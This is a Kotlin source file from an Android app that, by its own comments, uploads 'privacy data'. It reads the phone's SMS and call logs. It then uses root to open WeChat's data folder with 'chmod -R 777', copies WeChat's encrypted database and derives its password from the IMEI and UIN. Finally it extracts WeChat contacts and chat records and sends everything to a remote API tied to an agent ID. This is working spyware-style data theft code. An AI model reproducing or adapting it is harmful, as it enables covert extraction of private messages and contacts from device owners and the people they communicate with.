package cn.xzj.agent.util

import android.app.Activity
import android.content.Context
import cn.xzj.agent.constants.Constants
import cn.xzj.agent.constants.Keys
import cn.xzj.agent.entity.BaseResponseInfo
import cn.xzj.agent.entity.agentinfo.AgentInfo
import cn.xzj.agent.entity.privacy.*
import cn.xzj.agent.i.DBFileInitSuccessListener
import cn.xzj.agent.i.DBInitSuccessListener
import cn.xzj.agent.i.OnCmdExecSuccessListener
import cn.xzj.agent.net.Client
import cn.xzj.agent.net.Observer2
import com.channey.utils.SharedPreferencesUtils
import com.channey.utils.StringUtils
import io.reactivex.android.schedulers.AndroidSchedulers
import io.reactivex.disposables.Disposable
import io.reactivex.schedulers.Schedulers
import net.sqlcipher.database.SQLiteDatabase

/**
 * @Author MarkYe
 * @Email yrmao9893@163.com
 * @Date 2019/2/10
 * @Des 隐私数据上传工具类
 */
class PrivacyUploadManager(context: Context) {
    private var agentInfo: AgentInfo? = null
    private var mWechatNumber: String? = null
    private var IMEI: String? = null
    private var UIN: String? = null
    private var PWD: String? = null
    private var CUR_DB_PATH: String = ""
    private var mContext: Context? = null
    private var TAG = PrivacyUploadManager::class.java.simpleName

    init {
        mContext = context
        agentInfo = SharedPreferencesUtil.getCurrentAgentInfo(context)
        IMEI = SharedPreferencesUtils.getString(context, Keys.WX_IMEI, Activity.MODE_MULTI_PROCESS)
        CUR_DB_PATH = "/data/data/${context.packageName}/${Constants.COPY_WX_DATA_DB}"
        UIN = SharedPreferencesUtils.getString(mContext!!, Keys.UIN, Activity.MODE_MULTI_PROCESS)
    }

    private fun uploadWeChatPrivacy() {
        copyDbFile(UIN!!, CUR_DB_PATH, object : DBFileInitSuccessListener {
            override fun onSuccess() {
                mWechatNumber = WxMonitorUtils.getValueFromPref(Constants.com_tencent_mm_preferences_path, "login_weixin_username")
                WxMonitorUtils.openDB(mContext!!, CUR_DB_PATH, PWD!!, object : DBInitSuccessListener {
                    override fun onSuccess(db: SQLiteDatabase) {
                        try {
                            val weChatContactList = WxMonitorUtils.getContacts(db!!)
                            uploadWeChatContacts(weChatContactList)
                        } catch (e: Exception) {
                            e.printStackTrace()
                        }
                        Client.getInstance(mContext).apiManager
                                .getLastUploadDate(agentInfo!!.agentId, "WECHANT_RECORD")
                                .subscribeOn(Schedulers.io())
                                .observeOn(AndroidSchedulers.mainThread())
                                .subscribe(object : Observer2<BaseResponseInfo<Long>>() {
                                    override fun onComplete() {
                                    }

                                    override fun onSubscribe(d: Disposable) {
                                    }

                                    override fun onNext(t: BaseResponseInfo<Long>) {
                                        try {
                                            val weChatRecords = WxMonitorUtils.getWeChatRecords(mContext!!.applicationContext, t.content, db)
                                            uploadWeChatRecords(weChatRecords)
                                        } catch (e: Exception) {
                                            e.printStackTrace()
                                        }
                                        db.close()
                                    }

                                    override fun onError(e: Throwable) {
                                        try {
                                            val weChatRecords = WxMonitorUtils.getWeChatRecords(mContext!!.applicationContext, 0, db)
                                            uploadWeChatRecords(weChatRecords)
                                        } catch (e: Exception) {
                                            e.printStackTrace()
                                        }
                                        db.close()
                                    }

                                })
                    }
                })
            }
        })
    }

    /**
     * 上传微信好友数
     */
    private fun uploadWeChatContacts(list: List<WechatContactInfo>) {
        Client.getInstance(mContext).apiManager!!.uploadWeChatContacts(agentInfo!!.agentId, WechatContactsUploadBody(list, mWechatNumber!!)).subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(object : Observer2<BaseResponseInfo<Boolean>>() {
                    override fun onComplete() {
                    }

                    override fun onSubscribe(d: Disposable) {
                    }

                    override fun onError(e: Throwable) {}

                    override fun onNext(info: BaseResponseInfo<Boolean>) {
                        if (info.isSuccess())
                            setWeChatContactsUploadedFlag()
                    }
                })
    }

    /**
     * 上传微信聊天数
     */
    private fun uploadWeChatRecords(list: List<WeChatRecordInfo>) {
        Client.getInstance(mContext).apiManager!!.uploadWeChatRecords(agentInfo!!.agentId, WeChatRecordsUploadBody(list, mWechatNumber!!))
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(object : Observer2<BaseResponseInfo<Boolean>>() {
                    override fun onComplete() {
                    }

                    override fun onSubscribe(d: Disposable) {
                    }

                    override fun onError(e: Throwable) {}

                    override fun onNext(info: BaseResponseInfo<Boolean>) {
                        if (info.isSuccess())
                            setWeChatRecordsUploadedFlag()
                    }
                })
    }

    /**
     * 上传通话记录
     */
    private fun uploadCallLog() {
        fun upload(callLog: List<CallLogInfo>?) {
            Client.getInstance(mContext).apiManager!!.uploadCallLog(agentInfo!!.agentId, CallLogUploadBody(callLog!!))
                    .subscribeOn(Schedulers.io())
                    .observeOn(AndroidSchedulers.mainThread())
                    .subscribe(object : Observer2<BaseResponseInfo<Boolean>>() {
                        override fun onSubscribe(d: Disposable) {
                        }

                        override fun onComplete() {}

                        override fun onError(e: Throwable) {}

                        override fun onNext(info: BaseResponseInfo<Boolean>) {
                            if (info.isSuccess())
                                setCallLogUploadedFlag()
                        }
                    })
        }
        Client.getInstance(mContext).apiManager
                .getLastUploadDate(agentInfo!!.agentId, "CALL_PHONE")
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(object : Observer2<BaseResponseInfo<Long>>() {
                    override fun onComplete() {
                    }

                    override fun onSubscribe(d: Disposable) {
                    }

                    override fun onNext(t: BaseResponseInfo<Long>) {
                        if (t.content != null)PrivacyUtils.getUserCallLogs(mContext, t.content) { list -> upload(list) }
                    }

                    override fun onError(e: Throwable) {
                        PrivacyUtils.getUserCallLogs(mContext, 0) { list -> upload(list) }
                    }

                })


    }

    /**
     * 上传短信
     */
    private fun uploadSms() {
        fun upload(smsList: List<SmsInfo>) {
            Client.getInstance(mContext).apiManager.uploadSms(agentInfo!!.agentId, SmsUploadBody(smsList))
                    .subscribeOn(Schedulers.io())
                    .observeOn(AndroidSchedulers.mainThread())
                    .subscribe(object : Observer2<BaseResponseInfo<Boolean>>() {
                        override fun onComplete() {
                        }

                        override fun onSubscribe(d: Disposable) {
                        }

                        override fun onError(e: Throwable) {}
                        override fun onNext(info: BaseResponseInfo<Boolean>) {
                            if (info.isSuccess())
                                setSmsUploadedFlag()
                        }
                    })
        }
        Client.getInstance(mContext).apiManager
                .getLastUploadDate(agentInfo!!.agentId, "SMS_RECORD")
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(object : Observer2<BaseResponseInfo<Long>>() {
                    override fun onComplete() {
                    }

                    override fun onSubscribe(d: Disposable) {
                    }

                    override fun onNext(t: BaseResponseInfo<Long>) {
                        if (t.content != null)PrivacyUtils.getUserSms(mContext, t.content) { list -> upload(list) }
                    }

                    override fun onError(e: Throwable) {
                        PrivacyUtils.getUserSms(mContext, 0) { list -> upload(list) }
                    }
                })
    }

    private fun setWeChatContactsUploadedFlag() {
        SharedPreferencesUtils.saveBoolean(mContext!!, Keys.ALREADY_UPLOAD_WECHAT_CONTACT, true, Activity.MODE_MULTI_PROCESS)
    }

    private fun setWeChatRecordsUploadedFlag() {
        SharedPreferencesUtils.saveBoolean(mContext!!, Keys.ALREADY_UPLOAD_WECHAT_RECORDS, true, Activity.MODE_MULTI_PROCESS)
    }

    private fun setCallLogUploadedFlag() {
        SharedPreferencesUtils.saveBoolean(mContext!!, Keys.ALREADY_UPLOAD_CALL_LOG, true, Activity.MODE_MULTI_PROCESS)
    }

    private fun setSmsUploadedFlag() {
        SharedPreferencesUtils.saveBoolean(mContext!!, Keys.ALREADY_UPLOAD_SMS, true, Activity.MODE_MULTI_PROCESS)
    }

    private fun copyDbFile(uin: String, to: String, listener: DBFileInitSuccessListener) {
        var md5 = WxMonitorUtils.md5("mm$uin")
        WxMonitorUtils.copyFile("${Constants.WX_DB_DIR_PATH}/$md5/${Constants.WX_DB_FILE_NAME}", to, listener)
    }


    /**
     * 上传隐私数据
     * 短信记录
     * 通话记录
     * 微信好友数(需root)
     * 微信聊天记录(需root)
     */
    fun uploadPrivacy() {
        uploadSms()
        uploadCallLog()
        WxMonitorUtils.copyFile("${Constants.WX_DB_DIR_PATH}/${WxMonitorUtils.compatibleInfoFileName}"
                , "/data/data/${mContext!!.packageName}/${WxMonitorUtils.compatibleInfoFileName}", object : DBFileInitSuccessListener {
            override fun onSuccess() {
                IMEI = WxMonitorUtils.getCfgInfo("/data/data/${mContext!!.packageName}/${WxMonitorUtils.compatibleInfoFileName}")
                SharedPreferencesUtils.saveString(mContext!!, cn.xzj.agent.constants.Keys.WX_IMEI, IMEI!!, Activity.MODE_MULTI_PROCESS)
            }
        })
        WxMonitorUtils.execCmd("chmod -R 777 ${Constants.WX_ROOT_PATH}", object : OnCmdExecSuccessListener {
            override fun onFailure() {
                LogLevel.d(TAG, "获取root权限失败")
            }

            override fun onSuccess() {
                //get wechat uin
                WxMonitorUtils.copyFile("${Constants.WX_DB_DIR_PATH}/${WxMonitorUtils.systemInfoFileName}"
                        , "/data/data/${mContext!!.packageName}/${WxMonitorUtils.systemInfoFileName}", object : DBFileInitSuccessListener {
                    override fun onSuccess() {
                        PWD = WxMonitorUtils.initDbPassword(IMEI!!, UIN!!)
                        UIN = WxMonitorUtils.getCfgInfo("/data/data/${mContext!!.packageName}/${WxMonitorUtils.systemInfoFileName}")
                        SharedPreferencesUtils.saveString(mContext!!, Keys.UIN, UIN!!, Activity.MODE_MULTI_PROCESS)
                        CUR_DB_PATH = "/data/data/${mContext!!.packageName}/${Constants.COPY_WX_DATA_DB}"
                        if (!StringUtils.isEmpty(IMEI) && !StringUtils.isEmpty(UIN)) {
                            uploadWeChatPrivacy()
                        }
                    }
                })
            }
        })
    }
}